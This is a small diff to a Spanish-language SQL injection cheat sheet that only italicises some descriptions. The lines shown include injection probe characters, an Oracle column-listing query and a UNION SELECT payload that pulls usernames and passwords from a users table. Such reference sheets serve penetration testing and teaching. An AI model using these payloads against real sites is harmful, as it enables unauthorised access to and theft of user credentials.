@@ -2,7 +2,7 @@
 
 ## IDENTIFICAR LA VULNERABILIDAD
 
-' | simbolo comun para testear si existe SQLi o no.
+' | *simbolo comun para testear si existe SQLi o no.*
 
 " | simbolo comun para testear si existe SQLi o no.
 
@@ -62,7 +62,7 @@ SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS'
 
 #### MOSTRAR INFORMACION DE OTRAS TABLAS 
 
-' UNION SELECT username, password FROM users-- | retrieve the username and password from table "users"
+' UNION SELECT username, password FROM users-- | *retrieve the username and password from table "users"*
 
 
 
